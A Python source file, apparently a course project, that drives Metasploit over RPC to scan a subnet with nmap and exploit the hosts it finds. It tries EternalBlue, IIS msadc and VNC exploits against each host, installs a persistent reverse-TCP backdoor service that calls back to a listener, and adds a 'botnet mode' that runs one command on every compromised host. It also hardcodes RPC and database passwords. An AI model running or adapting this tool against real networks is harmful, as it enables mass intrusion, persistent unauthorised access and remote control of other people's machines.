from pymetasploit3.msfrpc import MsfRpcClient, Workspace, WorkspaceManager, HostsTable, MsfError, MeterpreterSession, MsfConsole
import pandas as pd
import os
import nmap3
import time
import sys
import re
from targetmanager import TargetManager, Target
from inpututils import InputUtils
from ascii import AsciiArt
nmap = nmap3.Nmap()

'''Performs a scan of a target subnet specified by user input'''
def perform_scan():
    try:
        subnet = InputUtils.get_text_input('Enter subnet:',r'\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}\/\d{1,3}') # get valid subnet user input
        print('Scanning...')
        nmap.scan_command(subnet, arg='-sV -O') # perform nmap OS and service scan
        print('Scanning Complete')
        return nmap.raw_ouput
    except Exception as e:
        print(e)


'''
Stop all sessions and consoles
'''
def exit_sessions(client):
    for sid in client.sessions.list.keys():
        print('Stopping session ' + sid)
        client.sessions.session(sid).stop()
    
    for cons in client.consoles.list:
        print('Destroying console ' + cons['id'])
        client.consoles.destroy(cons['id'])  


'''Try to find exploits for the vulnerable host'''
def find_exploits(console : MsfConsole):
    potential_exploits = ['windows/iis/msadc', 'windows/smb/ms17_010_eternalblue', 'multi/vnc/vnc_keyboard_exec']
    exploits = []
    for exploit in potential_exploits:
        console.write('search type:exploit platform:windows ' + exploit)
        
        output = ''
        while output == '' or console.is_busy():
            output += console.read()['data']
                
        if output != '':
            exploits.append(exploit)

    return exploits


'''
Use metasploit rpc to execute an exploit and payload
@ Return id of meterpreter session (sid) if exploit was successful, otherwise -1
'''
def exploit_target(console, exploit, payload, options):
    sid = -1
    options_str = 'use {}/{}\n'.format('exploit', exploit) # set the exploit
    if payload is not None:
        options_str += 'set PAYLOAD {}\n'.format(payload) # set the payload

    for option in options:
        options_str += 'set {} {}\n'.format(option[0], option[1]) # add additional options (e.g. RHOSTS)

    options_str += 'run -z\n' 
    
    console.write(options_str)
    data = ''
    l_time = 0
    while data == '' or console.is_busy() or l_time < 5: # execute while console is still producing output
        time.sleep(1)
        cons_read = console.read()['data']
        l_time = 0 if cons_read != '' else l_time+1

        # use regex to identify and only print relevant output
        out_match = re.match(r'\[[*,+,-]\].*', cons_read) 
        if out_match is not None:
            print(cons_read, end='')

        # regex to determine whether a session has been successfully created
        end_match = re.match(r'(.|\n)+(Meterpreter session) (\d{1,2}) opened(.+)', cons_read)
        sys.stdout.flush()
        if end_match:
            # set the session id based on regex match
            sid = end_match.group(3)
        
        data += cons_read
    print()
    return sid


'''
Helper to create a backdoor on the target host
'''
def set_persistence(console, sid, port):
    options = []
    options.append(['LHOST', '10.0.2.15'])
    options.append(['LPORT', port])
    options.append(['session', sid])

    return exploit_target(console, 'windows/local/persistence_service', None, options)


'''
Tries to exploit all targets using identified vulnerabilities, or using a backdoor.
'''
def perform_exploit(client : MsfRpcClient, console : MsfConsole, tm : TargetManager, exploits):
    targets = tm.get_targets_dict()
    # try to exploit each target in sequence
    for target in targets.keys():
            current_target = targets[target]
            print('\n=====================================')
            print('Trying to exploit: ' + target)
            print('=====================================')
            if current_target.is_exploited(): # ignore the target if it has already been exploited (i.e. has an existing session)
                print('Already Exploited!')
                continue

            if current_target.backdoor == True: # If the target has a backdoor, set up a handler to try initialise a meterpreter session
                print('Target has backdoor')
                ex_sid = exploit_target(console, 'multi/handler', 'windows/meterpreter/reverse_tcp', [['LHOST', '10.0.2.15'], ['LPORT', current_target.backdoor_port]])
                if int(ex_sid) > 0: # Session has been created successfully
                    print('Backdoor Success')
                    current_target.session = client.sessions.session(ex_sid)
                    current_target.how_exploited = 'Backdoor'
                    continue
                else:
                    print('Backdoor failed')
            
            for exploit in exploits: # Try each potential exploit in sequence, if it fails, try the next one, otherwise break loop if success
                print('-> Using exploit: ' + exploit)
                ex_sid = exploit_target(console, exploit, None, [['RHOSTS', target]])
                
                if int(ex_sid) > 0: # Session has been created successfully
                    print('Success!')
                    current_target.session = client.sessions.session(ex_sid)
                    current_target.how_exploited = exploit
                    # Add persistence
                    print('=====================================')
                    print('ADDING PERSISTENCE')
                    print('=====================================')
                    # Try to install persistent service on target for reverse tcp backdoor.
                    # Use a unique (i.e. not a backdoor port for any other targets) 
                    # listening port (where the service makes tcp request to) for the service payload
                    bd_port = tm.get_unique_port() 
                    p_sid = set_persistence(console, ex_sid, bd_port)
                    
                    if int(p_sid) > 0: # Success, add backdoor information to target
                        tm.set_backdoor(current_target, bd_port) 
                        client.sessions.session(p_sid).stop() # Close the session created from the persistence payload, we dont need it.
                    else:
                        print('Persistence failed')
                    break
                else:
                    print('Exploit failed, trying next...\n')


'''
Enter the meterpreter session for a specified target
Continue to read user input and excute the command unless 'bg' or 'exit' entered
bg -> background the session
exit -> exit the session
'''
def meterpreter_session(target : Target):
    try:
        # check whether target is online before executing command
        target.update_online_status() 
        session = target.session
        if session is None:
            print('No current session: target may be offline')
            return 

        # start reading user inputs and executing within meterpreter session
        cmd = None
        while True:
            print('>>> ', end='')
            cmd = input()
            if 'exit' in cmd:
                session.stop()
                target.stop_session()
                break
            elif 'bg' in cmd:
                break
            if 'cd' in cmd:
                session.runsingle(cmd)
            else:
                print(session.run_with_output(cmd))
    except MsfError as e:
        print('Stopping shell: ' + str(e))
        target.update_online_status()


'''
Enter a botnet session with all of the currently exploited hosts
Allows users to enter one command, and have it be excuted on all the exploited target hosts
'''
def botnet_session(targets):
        cmd = ''
        while 'exit' not in cmd and 'bg' not in cmd:
            print('>>> ', end='')
            cmd = input()

            for target in targets:
                try:
                    output = '======== Output for target ' + target.ip + '========\n'
                    target.update_online_status()
                    if target.session is None:
                        output += 'No current session: target may be offline'
                        print(output)
                        continue
                    if 'exit' in cmd:
                        target.session.stop()
                        target.stop_session()
                    elif 'bg' in cmd:
                        break
                    elif 'cd' in cmd:
                        target.session.runsingle(cmd)
                    else:
                        output += target.session.run_with_output(cmd) + '\n'
                        print(output)
                except MsfError as e:
                    print('Stopping session: ' + str(e))
                    target.update_online_status()


def main():
    print(AsciiArt.get_art())
    try:
        # connect to the metasploit database
        client = MsfRpcClient('uDIBkUec')
        print('Initialised MSF RPC client')
        client.db.connect('msf', 'msf', password='mbAfW9rRpXCsOAzkwBQeopVG+vms7b8+LgVhrFGPfEo=')
        # user choice to scan or use existing host info in DB
        scan = InputUtils.get_number_input('Use existing database (0), Perform new scan (1)', 1) == 1

        if scan: # remove old data from DB workspace and perform a scan 
            wsm = WorkspaceManager(client)
            wsm.remove('cybr471') 
            wsm.add('cybr471') 
            print('Database connection established')
            results = perform_scan()

        workspace = Workspace(client, 'cybr471')
        if scan: # import scan data to the cybr471 db workspace
            workspace.importdata(results)
            print('Scan data imported to MSF successfully')

        # parse the host info set in the msfdb using the target manager
        target_manager = TargetManager(workspace.hosts)
        target_manager.parse_targets_from_host(workspace.hosts.list)

        # purge any old sessions created, this might interfere
        print('Purge old sessions...')
        exit_sessions(client)

        # Create a new console and initialise
        console = client.consoles.console()
        print('Initialising console...')
        time.sleep(3)

        while True: 
            target_manager.update_online_statuses()
            targets_all = target_manager.get_targets_df()
            print('\n===================== All Targets =====================')
            print(targets_all)
            print('=======================================================')

            t_select = InputUtils.get_number_input('Exploit vulnerable hosts (0), Use meterpreter session (1), Exit (2)', 2)

            if t_select == 0: # Exploit all vulnerable hosts
                potential_exploits = find_exploits(console)
                if len(potential_exploits) > 0:
                    print('Found potential exploits!')
                perform_exploit(client, console, target_manager, potential_exploits)
            elif t_select == 1: # Choose a current meterpreter session to enter

                targets_exp = target_manager.get_targets_df(True)
                if len(targets_exp) == 0:
                    print('No targets exploited')
                    continue

                print('\n================== Exploited Targets ==================')
                print(targets_exp)
                print('=======================================================')

                t_select = InputUtils.get_number_input('Enter host session (host #), Botnet mode (0)', len(targets_exp))
                if t_select == 0: # Enter botnet mode to control all targets
                    print('BOTNET MODE')
                    t_dict = target_manager.get_targets_dict()
                    t = [t_dict[ip] for ip in t_dict.keys() if ip in targets_exp['IP'].values]
                    botnet_session(t)
                else: # Enter the selected host meterpreter session
                    target = target_manager.get_target(targets_exp.loc[t_select]['IP'])
                    meterpreter_session(target)
            else:
                break

        exit_sessions(client) # clean up, exit all sessions and console

    except Exception as e:
        print('Fatal error: ' + str(e))

if __name__== '__main__':
    main()